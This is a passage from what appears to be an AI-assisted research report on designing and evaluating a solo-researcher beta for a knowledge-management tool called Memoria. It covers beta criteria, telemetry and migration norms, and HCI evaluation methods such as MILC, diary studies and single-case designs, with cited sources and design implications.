only; (5) PROMISES = a published data-compat contract (markdown files stable and human-readable at every version, derived state always regenerable, automatic backup before any file-rewriting migration — Zotero-style honesty about one-way migrations, strengthened by Memoria's existing reversibility requirement) plus a two-tier breaking-change policy (vault formats stable; engine/CLI/prompts may change, per SemVer pre-release semantics) and channel discipline (risky builds → sandbox vault; only the tagged beta build touches the real vault, upgrading deliberately with backups). Exit review should emit a Superhuman-style 50/50 follow-up: amplify what beat the null workflow, fix the frictions that pushed the researcher back to it. All findings grounded in fetched pages or named, search-verified product behavior; beta.1 implications are marked inference.

- **Beta entry criteria: the product must reach a 'viable test state' before real users touch it — internal testing complete, core features exercisable end-to-end, docs prepared, and a feedback plan already in place**
  - Evidence: Centercode's beta guide (fetched): 'make certain your product is in a viable test state. It doesn't have to be completely bug-free' but must let users experience most features, after thorough internal QA. Testing-practice guides (softwaretestinghelp.com/beta-testing) list entry criteria as: planned internal tests complete, essential features working, a plan for collecting/analyzing/acting on feedback, and 'sufficient documentation and support materials' prepared before testers start.
  - Source: https://www.centercode.com/guides/the-ultimate-guide-to-beta-testing ; https://www.softwaretestinghelp.com/beta-testing/
  - Beta.1 implication: Beta.1's entry gate should be defined as: both workflows (information flow and compose flow) executable end-to-end on real material without developer intervention, a written manual for those two flows, and a working feedback-capture mechanism — all BEFORE the researcher starts the real scenario. Not feature-completeness, not zero bugs: end-to-end viability of the two flows is the bar.
- **Beta exit criteria are defined BEFORE the beta starts, and they are specific and measurable ('beta exit criteria' / 'launch readiness'), not discovered afterwards**
  - Evidence: Centercode (fetched): software exits beta when it reaches 'a level of stability and quality that meets the team's predefined criteria for release, called the beta exit criteria or launch readiness.' Entry/exit-criteria guides stress criteria must be 'specific and measurable' and agreed by stakeholders up front.
  - Source: https://www.centercode.com/guides/the-ultimate-guide-to-beta-testing ; https://www.enov8.com/blog/release-entry-exit-criteria-explained/
  - Beta.1 implication: Beta.1 must ship with a pre-registered evaluation plan: the specific questions it must answer (e.g., 'did the researcher complete one real project through both flows?', 'did they return unprompted?', 'where did they fall back to Zotero/Obsidian/ChatGPT?') and the thresholds for calling it a success/failure — written down before day one, because every prior Memoria threshold was invented and this is the first chance to validate any of them.
- **Betas are time-boxed, not open-ended: industry data says most beta tests run 3–12 weeks, long enough to cover the intended use cases**
  - Evidence: Centercode benchmark data (fetched): '86% of tests are done in 12 weeks or less'; duration 'should include enough time to cover the necessary use cases'; 76% of tests spend 1–2 weeks in preparation.
  - Source: https://www.centercode.com/guides/the-ultimate-guide-to-beta-testing
  - Beta.1 implication: Beta.1 should be a fixed window (roughly 6–12 weeks — one real research question carried from capture through export) with a scheduled review date. The abandonment risk makes open-ended betas self-defeating: if the researcher silently lapses, an open-ended beta never registers the failure; a fixed review date forces the verdict.
- **Cohort design for craft tools: small, high-touch, invite-only cohorts with a fix-loop between cohorts, rather than a wide launch (Linear model)**
  - Evidence: Linear stayed in private invite-only beta for ~a year (Apr 2019–Jun 2020), inviting cohorts of 10–20 users at a time; per founder interviews, 'we invite these people and then they say, hey, this is a problem... then we go fix that' before inviting the next cohort. 10,000+ waitlist, 1,000+ customers by public launch.
  - Source: https://www.news.aakashg.com/p/how-linear-grows ; https://www.growth-letter.com/p/this-startup-had-10000-people-on
  - Beta.1 implication: For a single-user product, the cohort unit is not 'users' but 'real projects': beta.1's cohort is n=1 researcher running one real project; the Linear loop translates to project → triage frictions → fix → next project. Do not design beta.1 around multiple external testers; design it around iterations of real scenarios with the one PI, each iteration gated on fixing the previous one's blockers.
- **Dogfooding precedes beta and is a distinct stage: the makers use the tool on their own real work for months before any 'beta' label is applied**
  - Evidence: JetBrains (2026 blog): Junie 'was used internally months before its closed beta'; GitLab's stated policy is to dogfood every feature ahead of GA; dogfooding is described across sources as 'internal beta testing' that complements, not replaces, external beta.
  - Source: https://blog.jetbrains.com/life-at-jetbrains/2026/05/dogfooding-at-jetbrains/ ; https://www.centercode.com/blog/dogfooding-101
  - Beta.1 implication: The alpha→beta boundary should be defined as the dogfood boundary: alphas run on synthetic/test corpora (Memoria-test sandbox); beta.1 begins the day the system touches the researcher's real corpus and live research question (memoria-private-equivalent). Entry criterion: the developer has already run both flows start-to-finish on real papers in the sandbox — beta.1 must not be the first real-data contact.
- **Measure product-market fit in beta via reliance, not opinion: Sean Ellis's 'how would you feel if you could no longer use it?' survey, asked only of people who used the core product at least twice in the past two weeks; 40% 'very disappointed' is the benchmark; ~40 respondents gives directional data (Superhuman went 22%→58% by acting on it)**
  - Evidence: First Round Review article (fetched directly): exact question 'How would you feel if you could no longer use Superhuman?' (Very/Somewhat/Not disappointed); recipients = 'users who had engaged with the core product at least twice in the previous two weeks'; 'directional results emerge around 40 respondents'; 40% threshold from Sean Ellis benchmarking ~100 startups; Superhuman moved 22% → 58% in three quarters.
  - Source: https://review.firstround.com/how-superhuman-built-an-engine-to-find-product-market-fit/
  - Beta.1 implication: With n=1 the survey statistics are meaningless, but the underlying signal — recency-gated reliance — is directly measurable: did the researcher use the core flows at least twice in the past two weeks, unprompted? That usage-recency criterion should be beta.1's primary fitness metric (a lapse IS the abandonment signal, observable in vault file mtimes/provenance records with zero extra instrumentation), plus a periodic self-administered 'would I be very disappointed to lose this vs. reverting to Zotero+Obsidian+ChatGPT?' judgment. This is inference from the source, adapted to n=1.
- **Feedback instrumentation is structured, categorized, and captured in the moment: bug report forms plus feedback forms organized into Issues / Ideas / Praise, surveys, and task-based feedback — not free recall after the fact**
  - Evidence: Centercode guide (fetched): feedback instrumentation = surveys, bug report forms, 'feedback forms (organized by Issues, Ideas, and Praise categories)', screen recordings, task/activity-based feedback collection.
  - Source: https://www.centercode.com/guides/the-ultimate-guide-to-beta-testing
  - Beta.1 implication: Beta.1 needs a zero-friction, in-context capture channel — the obvious Memoria-native form is a beta-journal note inside the vault itself (capturing friction at the moment it occurs, categorized issue/idea/praise), since any external tracker adds exactly the compliance cost that kills this product category. The journal is markdown, so it survives the keep-test and doubles as evaluation data.
- **For longitudinal, in-context evaluation the standard UX method is the diary study: single-session methods cannot capture long-term, real-context experience**
  - Evidence: Nielsen Norman Group: diary studies are the longitudinal method for 'long-term experiences and repetitive activities'; 'contextual and longitudinal insights cannot be collected through single-session moderated user-research methods' because those remove users from their personal context.
  - Source: https://www.nngroup.com/articles/diary-studies/
  - Beta.1 implication: Beta.1's evaluation design should formally be a self-diary study: dated entries at defined trigger moments (end of each session or each completed flow stage), plus scheduled weekly self-review checkpoints. This gives the n=1 beta methodological legitimacy — it is a recognized research method, not just 'the developer using his own tool and forming impressions.'
- **Telemetry consent for privacy-sensitive developer tools: opt-in (not opt-out) is the settled norm after public backlashes; when collected at all it is minimal, anonymous, publicly documented, and preceded by a first-run notice; the most privacy-positioned local tools collect nothing and make that a selling point**
  - Evidence: Go toolchain: Russ Cox's 'transparent telemetry' proposal (collect kilobytes/year, publish everything collected, decide metrics in public) was switched from on-by-default to opt-in after community pushback; Go 1.23 ships telemetry that uploads nothing by default. Homebrew: analytics 'not enabled until after this notice is shown' on first run, anonymized fields, documented retention, HOMEBREW_NO_ANALYTICS opt-out. Obsidian privacy policy: collects no personal data and no telemetry; plugin policies prohibit client-side telemetry.
  - Source: https://go.dev/blog/gotelemetry ; https://research.swtch.com/telemetry-opt-in ; https://docs.brew.sh/Analytics ; https://obsidian.md/privacy
  - Beta.1 implication: Beta.1 should have NO automatic phone-home telemetry — even with a cohort of one, the discipline matters because the product's trust story ('vault text leaves the machine only per explicit LLM call') must not acquire exceptions. The right pattern: metrics written locally into inspectable vault/log files (Go-style transparency: the user can read exactly what was recorded), and evaluation data leaves the machine only as a manually exported diagnostic/metrics bundle. API-call cost and volume tracking should be part of these local metrics, since cost is a real abandonment factor.
- **Upgrade/migration promises during beta: warn that data migrations may be one-way, require/automate backups before migration, and promise forward-compatibility into the next stable release even if downgrade is lossy**
  - Evidence: Zotero beta page (fetched, quoted): 'Beta versions occasionally update the database such that downgrading isn't possible without reverting to a backup copy of zotero.sqlite… or removing the local data directory and syncing'; but 'You'll always be able to switch to the next major production release of Zotero.' Obsidian early-access docs (fetched): downgrade instructions provided; mobile downgrade requires 'Back up your vault data' first. 1Password community threads document users unable to downgrade beta→production data.
  - Source: https://www.zotero.org/support/beta_builds ; https://obsidian.md/help/early-access ; https://www.1password.community/discussions/1password/unable-to-downgrade-from-beta-to-production/122142
  - Beta.1 implication: Beta.1 must publish a data-compatibility contract: (1) markdown vault files are the source of truth and remain human-readable at every version (the keep-test, strengthened to a beta promise); (2) all derived state (indexes, graphs, caches) is regenerable from files, so 'downgrade' = reinstall + rebuild, never data loss; (3) any migration that rewrites vault files takes an automatic timestamped backup first and is reversible via that backup. Zotero shows even careful projects accept one-way migrations in beta — Memoria's differentiator is that reversibility is already an epistemic requirement, so the beta promise comes almost free.
- **Breaking-change policy: pre-1.0/pre-release semver explicitly reserves the right to break anything ('Major version zero… Anything MAY change at any time. The public API SHOULD NOT be considered stable'), and platform vendors define beta/preview as 'not necessarily feature-complete, no SLA, no support commitments'**
  - Evidence: SemVer 2.0.0 spec, verbatim clause on 0.y.z and pre-release identifiers (1.0.0-beta.1 has lower precedence; ^ ranges skip pre-releases). Google Cloud launch stages: Preview offerings 'are not necessarily feature-complete, and no SLAs or technical support commitments are provided'; average Preview lasts ~6 months; GA adds the SLA.
  - Source: https://semver.org/ ; https://cloud.google.com/blog/products/gcp/google-cloud-gets-simplified-product-launch-stages
  - Beta.1 implication: Beta.1 should publish a two-tier stability contract instead of a blanket 'everything may change': Tier 1 STABLE = vault file formats, frontmatter schemas, provenance record format (these carry the keep-test and must not churn under the researcher's real corpus); Tier 2 UNSTABLE = engine behavior, prompts, CLI/config, derived indexes (free to break with changelog notes). Version it as 1.0.0-beta.N semver and keep a human-readable changelog with migration notes per release.
- **Docs readiness is part of the definition of done for the milestone, not an afterthought: documentation ships with the feature, and beta entry criteria include support materials and known-issues lists**
  - Evidence: GitLab Definition of Done: 'Documentation is required with the delivery of a feature for a specific milestone'; teams may mandate docs in the same MR as feature code. Beta-testing entry-criteria guides require 'sufficient documentation and support materials to help beta testers understand the software' before beta starts.
  - Source: https://docs.gitlab.com/development/definition_of_done/ ; https://www.softwaretestinghelp.com/beta-testing/
  - Beta.1 implication: Beta.1's deliverable includes a two-workflow user manual (walk the information flow and compose flow end-to-end, written for the researcher-as-user, not the developer), a known-issues/limitations page, and a 'what to do when an engine writes something wrong' recovery guide — the last one is Memoria-specific: because machines write into the KB without approval, the docs must teach verification/rollback, or trust collapses on first bad write.
- **Release channels separate risk tiers even for auto-updating tools: production/beta/nightly (1Password) or stable/unstable with even/odd version numbering (Tailscale), with the unstable channel explicitly 'not recommended for production'**
  - Evidence: 1Password support docs: three channels (production, beta, nightly), user-selectable, auto-update per channel. Tailscale docs: stable = even minor versions, unstable = odd minor versions, unstable 'not recommended for production environments'; changelog covers stable only.
  - Source: https://support.1password.com/betas/ ; https://tailscale.com/docs/reference/tailscale-client-versions
  - Beta.1 implication: Even single-user, beta.1 needs channel discipline mapped to vaults: risky/unreleased builds run only against the sandbox vault (Memoria-test); the tagged beta.1 build is the only thing allowed to touch the real research vault, and it updates deliberately (explicit upgrade step with pre-upgrade backup), never silently. This matches the existing sandbox/production vault split and makes 'which build touched my real data' always answerable.
- **Every beta feedback report is version-stamped and builds ship on a regular cadence with a working update path, so reports are reproducible and fixes reach the tester quickly**
  - Evidence: Obsidian early-access docs (fetched): bug reports must include 'the build version and the OS you're running it on', filed to a dedicated per-release channel. Zotero: beta builds 'are built regularly', auto-update, and users can update on demand via Check for Updates.
  - Source: https://obsidian.md/help/early-access ; https://www.zotero.org/support/beta_builds
  - Beta.1 implication: Beta.1 needs (a) a version identifier embedded in every provenance record and beta-journal entry automatically — Memoria already writes provenance, so stamping engine/app version into it is cheap and makes every complaint reproducible; and (b) a low-ceremony release loop (tag → install/upgrade script → rebuild indexes) so fixes reach the researcher within days, keeping the Linear-style fix loop alive during the beta window.
- **Beta results drive a disciplined 50/50 follow-up roadmap: half doubling down on what 'very disappointed' users love, half fixing what holds back the on-the-fence users — measured against the same metric each quarter**
  - Evidence: First Round Review (fetched): Superhuman split the roadmap 50/50 — double down on loved attributes (speed, shortcuts) / address friction of 'somewhat disappointed' segment (mobile, integrations, search) — and re-ran the PMF survey continuously, moving 22%→33%→58%.
  - Source: https://review.firstround.com/how-superhuman-built-an-engine-to-find-product-market-fit/
  - Beta.1 implication: Beta.1's exit review should produce exactly two ranked lists from the diary/journal data: (1) what beat the null workflow (Zotero+Obsidian+ChatGPT) — amplify it; (2) the frictions that pushed the researcher back toward the null workflow — fix the top ones before beta.2. This converts the n=1 evaluation into a roadmap mechanism rather than a pass/fail verdict, which fits a product whose dominant risk is gradual abandonment rather than acute failure.

### Evaluating knowledge-work tools at N≈1–10: protocols and metrics for a solo-researcher beta (diary/ESM, single-case designs, MILC, autobiographical design, personal-informatics abandonment, insight metrics, CHI/CSCW synthesis-tool evaluation)

The research converges on a coherent evaluation architecture for a solo-researcher beta, drawn from five method families that all target exactly the N≈1–10, expert-user, months-long, real-work regime. (1) FRAME: beta.1 is methodologically a MILC (Shneiderman & Plaisant 2006) run as autobiographical design (Neustaedter & Sengers 2012) — both verified primary sources demand genuine need (a live research question, not a demo corpus), pre-defined graded 'professional success', documentation of the workflow being replaced, instrumented usage logging, an in-tool incident/insight log, and months not weeks of use, with mid-beta tool fixes explicitly legitimate. (2) CAUSAL SPINE: WWC single-case standards (verified) make a lone before/after uninterpretable — beta.1 needs a measured null-workflow (Zotero+Obsidian+ChatGPT) baseline first, then repeated Memoria-vs-null contrasts (≥3 demonstrations, 3–5 measured sessions per phase) on at least one primary metric. (3) MEASUREMENT CHANNELS: vault-native snippet elicitation (friction/win one-liners, <10 min/day) plus event-contingent micro-prompts capped at ~2/day (95% response rate at 1–2/day; scheduled ESM only in 1–2-week bursts), plus automatic logs. (4) METRICS: cost side per Epstein (verified — collection/integration cost is the dominant abandonment driver at 43–57%) — minutes per work integrated, lapse/resumption instrumentation, API dollars; return side per Saraiya/North insight coding (verified) — insight events with time-to-first-insight and self-rated domain value — plus Threddy-style artifact throughput at fixed time and Synergi-style blind external judgment of paired compose outputs; the Russell et al. cost-structure ledger (representation cost vs downstream payoff) is the headline decision metric. (5) TIMING: ≥4–6 weeks post-onboarding with week-1 novelty burn-in and release-marker segmentation; the anti-abandonment success signature is a stable post-novelty usage plateau. Everything should be pre-registered in a short protocol with operational definitions and decision rules, with all thresholds marked provisional pending genuine-use data.

- **MILC (Multi-dimensional In-depth Long-term Case studies) — the canonical protocol for evaluating expert knowledge tools with 3–5 users over weeks-to-months**
  - Evidence: Verified from full text of Shneiderman & Plaisant (BELIV 2006). Efficacy is assessed by documenting (1) usage via observations, interviews, surveys, and automated logging, and (2) expert users' success in achieving their professional goals. Their explicit guidelines: specify focused research questions; identify 3–5 users; DOCUMENT THE CURRENT METHOD/TOOL BEING REPLACED before the study; determine in advance what constitutes professional success (e.g., paper submission) including partial-success levels; schedule observation/interviews front-loaded (long+frequent early, shorter later); instrument the tool to log features used/frequency/datasets; provide a log book for users to record comments, problems, and insights; provide training to expert level; encourage users to keep using the best tool for each task (to avoid pleasing-the-researcher bias); modify the tool during the study as needed; document successes and failures after each visit. Won BELIV Test-of-Time award 2016.
  - Source: http://www.cs.umd.edu/~ben/papers/Shneiderman2006Strategies.pdf ; https://dl.acm.org/doi/10.1145/1168149.1168158 ; https://hcil.umd.edu/milc-studies/
  - Beta.1 implication: MILC is the closest off-the-shelf template for beta.1. Concretely: (a) before switching, spend 1–2 weeks documenting the null workflow (Zotero+Obsidian+ChatGPT) on the live research question — this baseline documentation is a named MILC step, not optional; (b) define beta.1 'professional success' up front with graded levels (e.g., full success = a submitted/complete written section produced through the compose flow; partial = saturated argument graph, or completed lit-review outline); (c) usage logging must be a beta.1 feature (operations run, engines invoked, notes created, per-session timestamps) since 'instrument the tool' is half of the efficacy evidence; (d) mid-beta tool fixes are methodologically legitimate — record them, don't freeze the tool for purity.
- **Autobiographical design — the accepted HCI method for the exact beta.1 situation where the system builder is the user (N=1)**
  - Evidence: From search summaries of Neustaedter & Sengers (DIS 2012, 'Autobiographical Design in HCI Research: Designing and Learning through Use-It-Yourself'): defined as design research drawing on extensive genuine usage by those creating the system. Five tenets: Genuine Need, Real System, Fast Tinkering, Record Keeping and Data Collection, Long-term Usage (months or years). Hallmarks of quality: usage surprises that force rethinking the design; improvements driven by specific documented incidents of use; careful articulation of design decisions' impact on experience. Related legitimacy: Lucero et al. 'A Sample of One: First-Person Research Methods in HCI' (DIS 2019) and a CHI 2024 literature review of autoethnographies establish first-person methods as an accepted genre; standard criticism is that they are too subjective/a-theoretical — countered by record-keeping discipline.
  - Source: https://dl.acm.org/doi/10.1145/2317956.2318034 ; https://antle.iat.sfu.ca/wp-content/uploads/NeustaedterSengers_2012DIS_AutobioDesignMethodology.pdf ; https://dl.acm.org/doi/10.1145/3301019.3319996 ; https://dl.acm.org/doi/10.1145/3613904.3642355
  - Beta.1 implication: Beta.1 is methodologically an autobiographical design study — this is a strength, not an embarrassment, IF the tenets are met. Genuine Need: beta.1 must run on a real, currently-active research question the PI needs answered, never a rehearsed demo corpus. Record Keeping: a dated incident log (surprises, breakdowns, workarounds, design-change triggers) is what separates evidence from anecdote at N=1 — make it a vault-native note type. Long-term Usage: plan months of genuine use; a 2-week trial does not meet the method's bar. Fast Tinkering: fixing friction as it appears is part of the method — log each change and why.
- **Single-case experimental design (SCED) standards — the only rigorous causal framework at N=1, with concrete numeric thresholds**
  - Evidence: Verified from full text of the What Works Clearinghouse Single-Case Design Technical Documentation: a causal claim requires at least 3 demonstrations of the intervention effect at 3 different points in time; ABAB-type designs need a minimum of 4 phases per case with ≥5 data points per phase to Meet Standards (≥3 points per phase 'with reservations'; phases with <3 points are unusable); the outcome must be measured repeatedly by more than one assessor with inter-assessor agreement collected on ≥20% of sessions and minimum agreement 0.80 (kappa 0.60); effects are judged by visual analysis of level, trend, variability, immediacy (last 3 points of one phase vs first 3 of next), overlap, and cross-phase consistency; a stable documented baseline pattern is required before intervention.
  - Source: https://ies.ed.gov/ncee/wwc/docs/referenceresources/wwc_scd.pdf ; https://www.ncbi.nlm.nih.gov/pmc/articles/PMC10354076/
  - Beta.1 implication: A single before/after comparison ('I felt faster with Memoria') is formally uninterpretable — beta.1 should build in repeated phase contrasts on at least one primary metric. Practical N=1 adaptation: measure a stable null-workflow baseline first (≥5 sessions, e.g., 5 paper-capture-to-digest cycles in Zotero+Obsidian), then alternate blocks (e.g., week-long or task-batch A/B phases: capture batches of papers alternately with Memoria vs the null stack) targeting ≥3 Memoria-vs-null contrasts with ≥3–5 measured sessions per phase. Full WWC compliance is out of reach for a solo beta (no second assessor), so state the design as 'SCED-informed'; the load-bearing imports are baseline-first, repeated demonstrations, and per-session (not retrospective) measurement.
- **Personal-informatics abandonment research (Epstein et al.) — abandonment is driven overwhelmingly by collection/integration cost, and lapsing is a distinct, recoverable state**
  - Evidence: Verified from full text of Epstein et al., 'Beyond Abandonment to Next Steps' (CHI 2016; 193 surveyed former trackers + 12 interviews, two-coder kappa 0.74–1.0): six reasons people stop tracking — (1) cost of collecting and integrating (the dominant reason: 45.6% activity, 42.9% location, 57.1% finance trackers), (2) cost of having/sharing the data (45.2% of location trackers — a privacy-driven abandonment channel), (3) discomfort with information revealed, (4) data quality concerns ('inhibits effective reflection and consequently action'), (5) learned enough, (6) life circumstances change. The companion Lived Informatics Model (Epstein et al., UbiComp 2015) identifies four lapse modes: forgetting, difficulty managing upkeep, intentionally skipping, suspending — with lapsing and resuming as normal phases of use, not endpoints.
  - Source: https://depstein.net/assets/pubs/depstein_chi16c.pdf ; https://dl.acm.org/doi/10.1145/2858036.2858045 ; https://dl.acm.org/doi/10.1145/2750858.2804250
  - Beta.1 implication: Since abandonment is Memoria's stated dominant risk, beta.1 must measure the abandonment precursors, not just satisfaction: (a) per-item compliance cost as a primary metric — minutes from 'have PDF' to cataloged+digested, minutes per atomic note, minutes of upkeep per session; (b) lapse instrumentation — days-between-sessions distribution, lapse events (define operationally pre-beta, e.g., ≥7 consecutive days of no capture while research is active), and crucially resumption cost (time/friction to re-enter after a gap) since lapses WILL happen and recoverable lapses are the difference from abandonment; (c) two Epstein reasons map directly to Memoria design bets — 'data quality concerns' maps to trust in machine-written content (log every instance of the PI distrusting/redoing an engine output) and 'cost of having/sharing data' maps to the vault-text-leaves-machine-per-API-call property (log any hesitation to ingest sensitive material); (d) 'learned enough' does not apply — research is open-ended — so persistent disuse is a pure cost signal.
- **Insight-based evaluation (Saraiya/North) — quantifying open-ended knowledge-tool effectiveness by coding insight events**
  - Evidence: Verified via fetch of Saraiya, North & Duca (IEEE TVCG 2005): insights captured via think-aloud during open-ended analysis of real data are coded on: observation count, time (including time to first insight and insight onset over the session), domain value (expert-rated significance), hypotheses generated, directed vs unexpected, correctness, breadth vs depth, and category. Users ideally want 'maximum insight in least time.' A follow-up comparison (North, Saraiya, Duca, Information Visualization 2011) found the insight method reaches conclusions comparable to benchmark-task studies while preserving open-ended realism; noted drawback is analysis cost of coding think-aloud data.
  - Source: https://faculty.cc.gatech.edu/~john.stasko/8001/saraiya05.pdf ; https://journals.sagepub.com/doi/abs/10.1177/1473871611415989 ; https://dl.acm.org/doi/10.1145/1377966.1377971
  - Beta.1 implication: Define an 'insight event' for Memoria before the beta and make it one-tap capturable in the vault (e.g., a `win` note type): candidate types — unexpected connection between works surfaced by the graph, gap identified by compose-flow analysis that changed reading/writing plans, retrieved evidence that changed an argument. Log timestamp + trigger (which feature/engine surfaced it) + PI-rated domain value (1–5 at capture time; cheap and adequate at N=1). Headline metrics: insights per week, time-to-first-insight for a new research question entering the compose flow, and share of insights attributable to Memoria mechanisms vs ones the null workflow would plausibly also have produced (rate this honestly at weekly review). This is the field's accepted way to make 'the tool helped me think' measurable.
- **Longitudinal insight studies on the analyst's own real data — short-term staged tasks systematically miss what matters**
  - Evidence: From abstract/search summaries of Saraiya, North, Lam & Duca, 'An Insight-Based Longitudinal Study of Visual Analytics' (IEEE TVCG 2006): explicitly motivated by the gap that controlled studies observe short-term usage on preselected datasets and benchmark tasks and therefore miss long-term real-world tool usage; the study instead captured an entire real bioinformatics analysis from raw data to sought insights, yielding observations about the insight-generation process itself. Consistent with the MILC argument and with Siek et al.'s field-deployment chapter (Ways of Knowing in HCI): deployments reveal acceptance, adoption, and appropriation over time in context.
  - Source: https://pubmed.ncbi.nlm.nih.gov/17073373/ ; https://ieeexplore.ieee.org/document/1703371/ ; https://link.springer.com/chapter/10.1007/978-1-4939-0378-8_6
  - Beta.1 implication: Beta.1's evaluation unit should be one complete real trajectory: a live research question taken from question → catalog/graph analysis → gap-driven capture → saturated argument graph → outline → written output. Staged mini-tasks can supplement (for the SCED-style contrasts) but the primary evidence is the end-to-end trace on the PI's actual project. This also fixes what beta.1 must CONTAIN: every step of the two workflows must be present at least in minimal form, because a longitudinal trajectory cannot route around missing stages.
- **Diary studies: snippet-based elicitation beats structured feedback diaries for burden; keep daily cost under 10–15 minutes**
  - Evidence: Feedback-vs-elicitation distinction from the diary-study literature (Carter & Mankoff 2005; summarized in DiaryHelper, arXiv 2404.19738): feedback diaries answer full question sets in situ (accurate but effortful); elicitation diaries capture a quick snippet (photo/phrase) in the moment as a memory cue elaborated in a later interview — less burdensome, suited to high-frequency events. NN/g practitioner guidance (verified across their diary-study articles): keep daily entry time under 10–15 minutes; give a simple, specific logging framework; interval-based incentives beat lump-sum for longer studies; personally check in after 2+ missed entries; overrecruit for dropout.
  - Source: https://arxiv.org/pdf/2404.19738 ; https://www.madpickle.net/scott/pubs/carter-diary-05.pdf ; https://www.nngroup.com/articles/diary-studies/ ; https://www.nngroup.com/articles/diary-study-incentives/ ; https://www.nngroup.com/articles/better-diary-studies/
  - Beta.1 implication: The beta.1 diary should live INSIDE the vault as snippet elicitation, not in an external survey tool: a hotkey-level `friction`/`win` capture (one line + auto-timestamp + auto-context of what the PI was doing) with elaboration deferred to a weekly 30-minute self-review that turns snippets into coded incidents. Budget: <10 min/day of measurement overhead, hard cap — the diary must not itself become an abandonment-inducing compliance cost (the meta-risk is real: the product risk IS compliance cost, so the evaluation must not add much). The 'missed 2+ entries' rule becomes a self-monitoring tripwire: measurement lapses are themselves data about overload weeks.
- **ESM burden thresholds: 1–2 prompts/day sustains ~95% response; signal-contingent designs cap at 1–2 weeks; event-contingent sampling is the long-duration option**
  - Evidence: Verified via fetch of ConductScience's ESM methods page: studies signaling 1–2×/day achieved ~95% response rates while >8 signals/day dropped to 60–80%; signal-contingent studies 'should not last for more than 1–2 weeks as they might become too burdensome'; event-contingent designs suit infrequent events and can run from a week to several months. From search summary of a BMC Psychiatry systematic review of ESM design decisions: collecting extra data alongside ESM reduced data completeness by 19%, and each additional enrolled day cost ~0.5% completeness.
  - Source: https://conductscience.com/digital-health/experience-sampling-methods/ ; https://link.springer.com/article/10.1186/s12888-022-04319-x ; https://affective-science.org/pubs/2003/ESM2003.pdf
  - Beta.1 implication: Do not run scheduled experience prompts for the whole beta — over months they will be ignored or resented. Design: event-contingent micro-prompts triggered by tool milestones (finished digesting a work; engine run completed; export produced) asking 1–2 questions (e.g., 'worth the time? 1–5' / 'trust this output? 1–5'), rate-limited to ≤2/day globally. If a period of intensive subjective sampling is wanted (e.g., comparing perceived load across A/B phases), confine it to bounded 1–2-week bursts. Every added instrument measurably reduces compliance with all the others — the 19% figure argues for one integrated capture channel, not parallel diaries+surveys+prompts.
- **Field-deployment timing: novelty effects dominate early usage; measure for ≥4 weeks and segment analysis around week 1 and around each feature drop**
  - Evidence: From search summaries: large-display deployment research (ECSCW/EUSSET) observed interaction peaking in week 1 (~70 interactions/week) then halving and stabilizing (~30/week) by week 2, and deployments choose 4-week minimums specifically 'to provide enough time to investigate the initial novelty effect'; novelty recurs both at first deployment and whenever changes are made to an existing system. 'Not Just Novelty' (CHI 2024, arXiv 2402.09894), a 3-week longitudinal study of an LLM-assisted workflow, found sustained use after novelty was driven by perceived utility and by users customizing the workflow — a direct precedent for evaluating an LLM-engine tool longitudinally.
  - Source: https://dl.eusset.eu/bitstream/20.500.12015/3115/1/ecscw2018-exploratory-paper-3.pdf ; https://en.wikipedia.org/wiki/Novelty_effect ; https://arxiv.org/abs/2402.09894 ; https://link.springer.com/chapter/10.1007/978-1-4939-0378-8_6
  - Beta.1 implication: Set the minimum beta.1 evaluation window at 4–6 weeks of genuine use AFTER onboarding, and treat week 1 as a burn-in segment excluded from (or flagged in) trend metrics. Because mid-beta tool changes re-trigger novelty, either batch feature changes between measurement windows or annotate the usage log with release markers so week-over-week retention/usage curves can be segmented. The single most important shape to look for is the week-2+ plateau: sustained post-novelty usage at a stable level is the anti-abandonment signal; a decay curve that never stabilizes is the failure signature even if week-1 numbers look great.
- **How CHI/UIST measures capture-and-organize tool effectiveness (Threddy pattern): artifact throughput at fixed time on the user's OWN materials, plus validated workload/flow instruments**
  - Evidence: Verified from full text of Threddy (UIST 2022): N=9 within-subject study vs a Google Docs baseline; two 20-minute timed literature-review tasks seeded with papers each participant had submitted as personally motivating for their own literature reviews; measures = 6-item NASA-TLX (demand/performance), a 5-item Technology Acceptance Model adaptation (workflow compatibility, ease of learning), Webster et al.'s 11-item flow questionnaire, plus log-coded artifact counts (threads, clips, references) double-coded with Krippendorff's alpha 0.82–0.96. Results: equal thread counts, 2× clips (9.9 vs 4.9, p=.006), 2.6× references (20.4 vs 7.9, p=.03) — effectiveness operationalized as more structured knowledge captured per unit time at non-worse workload.
  - Source: https://arxiv.org/pdf/2208.03455 ; https://dl.acm.org/doi/10.1145/3526113.3545660
  - Beta.1 implication: Memoria's information-flow effectiveness has field-standard, vault-countable analogs: works cataloged per hour, annotations anchored per reading session, notes linked to hubs (vs orphaned), all at fixed time budgets — comparable against the same counts from the null-workflow baseline phase. Using the PI's own in-progress papers as test material is established practice, not a validity hole. Adopt NASA-TLX (6 items, 2 minutes) as the per-phase workload instrument — it is the one standardized questionnaire worth keeping at N=1 because it enables phase-to-phase comparison; skip TAM/flow batteries (they answer adoption questions that are moot for a self-built tool).
- **How CHI/UIST measures synthesis/compose quality (Synergi pattern): blind expert judgment of the produced artifact against baseline-produced artifacts**
  - Evidence: From search summaries of Synergi (UIST 2023): user-generated research outlines were evaluated blind-to-condition against outlines from a Threddy-based baseline and a GPT-4 approach; experts rated overall helpfulness on a 7-point Likert scale (Synergi +1.6 over GPT-4, +2.6 over Threddy) and judged whether threads were better supported with evidence from the literature. The evaluated object is the OUTPUT of the workflow, not tool interactions.
  - Source: https://dl.acm.org/doi/abs/10.1145/3586183.3606759 ; https://arxiv.org/abs/2308.07517
  - Beta.1 implication: For the compose flow, the accepted effectiveness measure is blind comparative judgment of outputs. N=1 adaptation: produce paired artifacts — e.g., two lit-review outlines or argument summaries on comparable sub-questions, one via Memoria's compose flow, one via the null workflow — strip identifying formatting, and have 1–2 external colleagues rate helpfulness and evidence-support on 7-point scales without knowing which is which. Also directly measurable at N=1: evidence-support itself (fraction of claims in the output with a provenance link back to a cataloged work — Memoria's provenance system makes this countable automatically, and the null workflow's equivalent requires manual audit; this asymmetry is itself a result).
- **Sensemaking cost-structure analysis (Russell, Stefik, Pirolli & Card, CHI '93): tool value = value of task questions answered minus cost of building and maintaining the representation**
  - Evidence: From search summaries of 'The Cost Structure of Sensemaking' (INTERCHI '93): sensemaking is the process of searching for a representation and encoding data in it to answer task-specific questions; the learning loop complex describes the cycle of building representations and encoding data into them; representations are chosen and CHANGED to reduce the cost of operations — i.e., a structuring tool is only rational if representation-building cost is repaid by cheaper downstream operations. Canonical framing paper for the entire sensemaking-tools literature.
